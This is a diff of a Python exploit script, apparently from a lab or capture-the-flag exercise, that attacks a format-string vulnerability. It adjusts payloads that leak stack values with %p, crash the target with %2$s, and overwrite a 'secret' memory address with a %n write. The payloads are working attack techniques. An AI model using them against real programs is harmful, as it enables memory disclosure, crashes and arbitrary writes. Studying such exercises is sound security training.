@@ -74,9 +74,9 @@ str_sig = "RIPP"
 str_sig_hex = "0x" + "".join("{:02x}".format(ord(c)) for c in str_sig[::-1])
 print "Signature: \"" + str_sig + "\", hex: " + str(str_sig_hex)
 p, secret0_addr, secret1_addr = run(False)
-inject("RIPPAAAA%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p\n", False)
+inject("RIPPAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p\n", False)
 line = read_and_print(p) #payload result
-spsi = 1 + line.split(",").index(str(str_sig_hex))
+spsi = line.split(",").index(str(str_sig_hex))
 print "Stack position of string input: " + str(spsi)
 p.close()
 print
@@ -85,7 +85,7 @@ print
 print "---------------------------------------------------------------------"
 print "Part 1a) Crash the program"
 p, _, _ = run(0)
-inject("%x%s\n")
+inject("%2$s\n")
 p.close()
 print "Program signal: " + str(p.signalstatus) + " (" + SIGNALS_TO_NAMES_DICT[p.signalstatus] + ")"
 print
@@ -116,5 +116,5 @@ secret1_hex_le = struct.pack('<I', secret1_addr)
 # print "secret[1] address little endian: 0x" + secret1_hex_le.encode('hex')
 sleep(0.1)  #delay needed to make setraw work
 tty.setraw(p.fileno())
-inject(secret1_hex_le + "%" + str(spsi) + "$" + str(write_val - len(secret1_hex_le)) + ".0s%" + str(spsi) + "$n\n", False)
+inject(secret1_hex_le + "%" + str(write_val - len(secret1_hex_le)) + ".0s%" + str(spsi) + "$n\n", False)
 p.close()
